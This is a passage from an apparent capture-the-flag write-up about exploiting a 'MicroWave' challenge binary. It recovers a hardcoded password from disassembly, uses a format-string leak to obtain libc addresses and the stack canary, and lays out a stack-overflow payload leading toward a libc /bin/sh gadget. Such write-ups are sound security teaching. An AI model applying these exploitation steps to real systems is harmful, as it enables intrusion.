      &lt;span class="mh"&gt;0x00000f98&lt;/span&gt;      &lt;span class="mi"&gt;488&lt;/span&gt;&lt;span class="n"&gt;b1d713020&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;  &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;qword&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rip&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x203071&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x204010&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x2b56&lt;/span&gt; &lt;span class="n"&gt;str&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;n07_7h3_fl46&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;V&lt;/span&gt;
      &lt;span class="mh"&gt;0x00000f9f&lt;/span&gt;      &lt;span class="mi"&gt;4889&lt;/span&gt;&lt;span class="n"&gt;df&lt;/span&gt;         &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;rdi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rbx&lt;/span&gt;
      &lt;span class="mh"&gt;0x00000fa2&lt;/span&gt;      &lt;span class="n"&gt;e849faffff&lt;/span&gt;     &lt;span class="n"&gt;call&lt;/span&gt; &lt;span class="n"&gt;sym&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;imp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strlen&lt;/span&gt;         &lt;span class="p"&gt;;[&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
      &lt;span class="mh"&gt;0x00000fa7&lt;/span&gt;      &lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="n"&gt;d2&lt;/span&gt;           &lt;span class="n"&gt;xor&lt;/span&gt; &lt;span class="n"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;edx&lt;/span&gt;
  &lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;=&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fa9&lt;/span&gt;      &lt;span class="n"&gt;eb13&lt;/span&gt;           &lt;span class="n"&gt;jmp&lt;/span&gt; &lt;span class="mh"&gt;0xfbe&lt;/span&gt;                   &lt;span class="p"&gt;;[&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="mh"&gt;0x00000fab&lt;/span&gt;      &lt;span class="mf"&gt;0f1f&lt;/span&gt;&lt;span class="mi"&gt;440000&lt;/span&gt;     &lt;span class="n"&gt;nop&lt;/span&gt; &lt;span class="n"&gt;dword&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rax&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;JMP&lt;/span&gt; &lt;span class="n"&gt;XREF&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="mh"&gt;0x00000fc1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__printf_chk_f00&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;--&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fb0&lt;/span&gt;      &lt;span class="mf"&gt;0f&lt;/span&gt;&lt;span class="n"&gt;b60c13&lt;/span&gt;       &lt;span class="n"&gt;movzx&lt;/span&gt; &lt;span class="n"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;byte&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rbx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;    &lt;span class="c1"&gt;// LOAD THE PASSWORD CHAR&lt;/span&gt;
 &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="mh"&gt;0x00000fb4&lt;/span&gt;      &lt;span class="mi"&gt;384&lt;/span&gt;&lt;span class="n"&gt;c1528&lt;/span&gt;       &lt;span class="n"&gt;cmp&lt;/span&gt; &lt;span class="n"&gt;byte&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rbp&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;rdx&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x28&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;cl&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0xa&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;// COMPARE PROVIDED PASSWORD CHAR&lt;/span&gt;
&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;===&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fb8&lt;/span&gt;      &lt;span class="mi"&gt;752&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;           &lt;span class="n"&gt;jne&lt;/span&gt; &lt;span class="mh"&gt;0xfe8&lt;/span&gt;                   &lt;span class="p"&gt;;[&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;|||&lt;/span&gt;   &lt;span class="mh"&gt;0x00000fba&lt;/span&gt;      &lt;span class="mi"&gt;4883&lt;/span&gt;&lt;span class="n"&gt;c201&lt;/span&gt;       &lt;span class="n"&gt;add&lt;/span&gt; &lt;span class="n"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;                     &lt;span class="c1"&gt;// NEXT CHAR&lt;/span&gt;
&lt;span class="o"&gt;|||&lt;/span&gt;   &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;JMP&lt;/span&gt; &lt;span class="n"&gt;XREF&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="mh"&gt;0x00000fa9&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__printf_chk_f00&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;||&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fbe&lt;/span&gt;      &lt;span class="mi"&gt;4839&lt;/span&gt;&lt;span class="n"&gt;c2&lt;/span&gt;         &lt;span class="n"&gt;cmp&lt;/span&gt; &lt;span class="n"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rax&lt;/span&gt;                   &lt;span class="c1"&gt;// CHECK REACH END OF STRING&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="o"&gt;==&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fc1&lt;/span&gt;      &lt;span class="mi"&gt;75&lt;/span&gt;&lt;span class="n"&gt;ed&lt;/span&gt;           &lt;span class="n"&gt;jne&lt;/span&gt; &lt;span class="mh"&gt;0xfb0&lt;/span&gt;                   &lt;span class="p"&gt;;[&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;// GO ON&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;     &lt;span class="mh"&gt;0x00000fc3&lt;/span&gt;      &lt;span class="n"&gt;b801000000&lt;/span&gt;     &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;     &lt;span class="mh"&gt;0x00000fc8&lt;/span&gt;      &lt;span class="mi"&gt;6689453&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;       &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;word&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rbp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;arg_3ch&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;ax&lt;/span&gt;  &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x3c&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;&amp;lt;&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;// RETURN VALUE 1&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;     &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;JMP&lt;/span&gt; &lt;span class="n"&gt;XREF&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="mh"&gt;0x00000fee&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__printf_chk_f00&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fcc&lt;/span&gt;      &lt;span class="mi"&gt;488&lt;/span&gt;&lt;span class="n"&gt;b442408&lt;/span&gt;     &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;qword&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rsp&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;    &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x8&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;   &lt;span class="mh"&gt;0x00000fd1&lt;/span&gt;      &lt;span class="mf"&gt;644833042528.&lt;/span&gt;  &lt;span class="n"&gt;xor&lt;/span&gt; &lt;span class="n"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;qword&lt;/span&gt; &lt;span class="nl"&gt;fs&lt;/span&gt;&lt;span class="p"&gt;:[&lt;/span&gt;&lt;span class="mh"&gt;0x28&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;==&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fda&lt;/span&gt;      &lt;span class="mi"&gt;7514&lt;/span&gt;           &lt;span class="n"&gt;jne&lt;/span&gt; &lt;span class="mh"&gt;0xff0&lt;/span&gt;                   &lt;span class="p"&gt;;[&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;|||&lt;/span&gt;   &lt;span class="mh"&gt;0x00000fdc&lt;/span&gt;      &lt;span class="mi"&gt;4883&lt;/span&gt;&lt;span class="n"&gt;c410&lt;/span&gt;       &lt;span class="n"&gt;add&lt;/span&gt; &lt;span class="n"&gt;rsp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x10&lt;/span&gt;                                                               &lt;span class="s"&gt;&amp;quot;&lt;/span&gt;

&lt;span class="p"&gt;...&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;snip&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt;

&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="o"&gt;---&amp;gt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fe8&lt;/span&gt;      &lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="n"&gt;d2&lt;/span&gt;           &lt;span class="n"&gt;xor&lt;/span&gt; &lt;span class="n"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;edx&lt;/span&gt;
 &lt;span class="o"&gt;||&lt;/span&gt;   &lt;span class="mh"&gt;0x00000fea&lt;/span&gt;      &lt;span class="mi"&gt;6689553&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;       &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;word&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rbp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;arg_3ch&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;dx&lt;/span&gt;  &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x3c&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;&amp;lt;&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;// RETURN VALUE 0&lt;/span&gt;
 &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="o"&gt;=&amp;lt;&lt;/span&gt; &lt;span class="mh"&gt;0x00000fee&lt;/span&gt;      &lt;span class="n"&gt;ebdc&lt;/span&gt;           &lt;span class="n"&gt;jmp&lt;/span&gt; &lt;span class="mh"&gt;0xfcc&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The password is thus &lt;code&gt;n07_7h3_fl46&lt;/code&gt;.
It was however possible to "see" it using a simple &lt;code&gt;strings&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Vuln1: string format&lt;/h3&gt;
&lt;p&gt;The first vulnerability is a string format on the username when
connecting to twitter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; --------------------------------------------------------
 &lt;span class="p"&gt;|&lt;/span&gt;     Welcome to the next generation of MicroWaves!    &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;                         ***                          &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt; This stylish Microwave with Grill &lt;span class="k"&gt;function&lt;/span&gt;, includes &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;      a &lt;span class="k"&gt;function&lt;/span&gt; that tweets your favourite food!     &lt;span class="p"&gt;|&lt;/span&gt;
 &lt;span class="p"&gt;|&lt;/span&gt;                         ***                          &lt;span class="p"&gt;|&lt;/span&gt;
 --------------------------------------------------------
           ----------------------------------
           &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="m"&gt;1&lt;/span&gt;. Connect to Twitter account &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="m"&gt;2&lt;/span&gt;. Edit your tweet            &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  &lt;span class="m"&gt;3&lt;/span&gt;. Grill &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; Tweet your food    &lt;span class="p"&gt;|&lt;/span&gt;
           &lt;span class="p"&gt;|&lt;/span&gt;  q. Exit                       &lt;span class="p"&gt;|&lt;/span&gt;
           ----------------------------------

           &lt;span class="o"&gt;[&lt;/span&gt;MicroWave&lt;span class="o"&gt;]&lt;/span&gt;: &lt;span class="m"&gt;1&lt;/span&gt;

           Log in on Twitter:
           username: %p.%p.%p.%p.%p.%p.%p.%p
           password: n07_7h3_fl46

Checking 0xa.0x7ffff7b0ce50.0x7ffff7fd8700.0x555555556ac0.&lt;span class="o"&gt;(&lt;/span&gt;nil&lt;span class="o"&gt;)&lt;/span&gt;.0xeaa546f902a74f00.0x7ffff7dd7710.0x7ffff7dd7718
Twitter account
............
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It is thus possible to read up the stack. The leaked values are indeed interesting
and will be used later:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;0x7ffff7...&lt;/em&gt; look like libc addresses&lt;/li&gt;
&lt;li&gt;&lt;em&gt;0xeaa546f902a74f00&lt;/em&gt; looks like the canary&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Vuln2: stack overflow&lt;/h3&gt;
&lt;p&gt;The second vulnerability is triggered when reading the content to tweet.
It reads from stdin (0) and store the result on the stack&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x00000ac0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;iz&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;grep&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;#&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;vaddr&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x00002adb&lt;/span&gt; &lt;span class="n"&gt;paddr&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x00002adb&lt;/span&gt; &lt;span class="n"&gt;ordinal&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mo"&gt;01&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt; &lt;span class="n"&gt;sz&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;16&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt; &lt;span class="n"&gt;section&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rodata&lt;/span&gt; &lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ascii&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;           &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x00000ac0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;axt&lt;/span&gt; &lt;span class="mh"&gt;0x00002adb&lt;/span&gt;
&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="mh"&gt;0x1007&lt;/span&gt; &lt;span class="n"&gt;lea&lt;/span&gt; &lt;span class="n"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;rip&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mh"&gt;0x1acd&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sub&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__printf_chk_0&lt;/span&gt;
&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x00000ac0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;pd&lt;/span&gt; &lt;span class="mh"&gt;@0x1007&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;span class="mh"&gt;0x00001032&lt;/span&gt;      &lt;span class="mf"&gt;31ff&lt;/span&gt;           &lt;span class="n"&gt;xor&lt;/span&gt; &lt;span class="n"&gt;edi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;edi&lt;/span&gt; &lt;span class="c1"&gt;// 0 == STDIN&lt;/span&gt;
&lt;span class="mh"&gt;0x00001034&lt;/span&gt;      &lt;span class="mf"&gt;4889e6&lt;/span&gt;         &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;rsp&lt;/span&gt; &lt;span class="c1"&gt;// buffer on the stack&lt;/span&gt;
&lt;span class="mh"&gt;0x00001037&lt;/span&gt;      &lt;span class="n"&gt;ba00080000&lt;/span&gt;     &lt;span class="n"&gt;mov&lt;/span&gt; &lt;span class="n"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;section&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;rela&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;plt&lt;/span&gt;  &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;@? &amp;quot;&lt;/span&gt; &lt;span class="p"&gt;@&lt;/span&gt; &lt;span class="mh"&gt;0x800&lt;/span&gt;
&lt;span class="mh"&gt;0x0000103c&lt;/span&gt;      &lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="n"&gt;c0&lt;/span&gt;           &lt;span class="n"&gt;xor&lt;/span&gt; &lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;eax&lt;/span&gt;
&lt;span class="mh"&gt;0x0000103e&lt;/span&gt;      &lt;span class="n"&gt;e8ddf9ffff&lt;/span&gt;     &lt;span class="n"&gt;call&lt;/span&gt; &lt;span class="n"&gt;sym&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;imp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;
&lt;span class="p"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We read up to 0x800 (2048) from stdin to the buffer (on the stack).
If we consider the whole block, only 0x418 (1048) are reserved
on the stack. We can thus overwrite saved RIP&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sub rsp, 0x418                  | reserve 1048
lea rsi, [rip + 0x1acd]         |
mov edi, 1                      |
mov rax, qword fs:[0x28]        | get the canary
mov qword [rsp + 0x408], rax    | store canary at 1032
xor eax, eax                    |
call sym.imp.__printf_chk ;[a]  |
xor edi, edi                    |
call sym.imp.fflush ;[b]        |
xor edi, edi                    | 0 == stdin
mov rsi, rsp                    | buffer on the stack
mov edx, section..rela.plt      | 0x800
xor eax, eax                    |
call sym.imp.read ;[c]          |
lea rdi, [rip + 0x1aa1]         |
call sym.imp.puts ;[d]          |
mov rax, qword [rsp + 0x408]    |
xor rax, qword fs:[0x28]        |
jne 0x106a ;[e]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So to overflow saved RIP, the payload should look like this:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1032 bytes of junk&lt;/li&gt;
&lt;li&gt;8 bytes to replace the canary&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1048-1032-8 = 8&lt;/code&gt; bytes&lt;/li&gt;
&lt;li&gt;saved RIP&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;The exploit&lt;/h2&gt;
&lt;p&gt;Due to the protections, one needs to exploit the binary using ROP.
However looking into the provided libc shows that the &lt;em&gt;magic&lt;/em&gt; ROP chain
is present.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;000000000004652&lt;/span&gt;&lt;span class="nf"&gt;C&lt;/span&gt; &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;cs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;environ_ptr_0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0000000000046533&lt;/span&gt; &lt;span class="nf"&gt;lea&lt;/span&gt;     &lt;span class="no"&gt;rdi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;aBinSh&lt;/span&gt;     &lt;span class="c"&gt;; &amp;quot;/bin/sh&amp;quot;&lt;/span&gt;
&lt;span class="no"&gt;.text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;000000000004653&lt;/span&gt;&lt;span class="no"&gt;A&lt;/span&gt; &lt;span class="no"&gt;lea&lt;/span&gt;     &lt;span class="no"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;rsp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;180&lt;/span&gt;&lt;span class="no"&gt;h&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="no"&gt;var_150&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;000000000004653&lt;/span&gt;&lt;span class="nf"&gt;F&lt;/span&gt; &lt;span class="no"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;cs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;dword_3C06C0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="nl"&gt;.text:&lt;/span&gt;&lt;span class="err"&gt;0000000000046549&lt;/span&gt; &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;cs&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="no"&gt;dword_3C06D0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
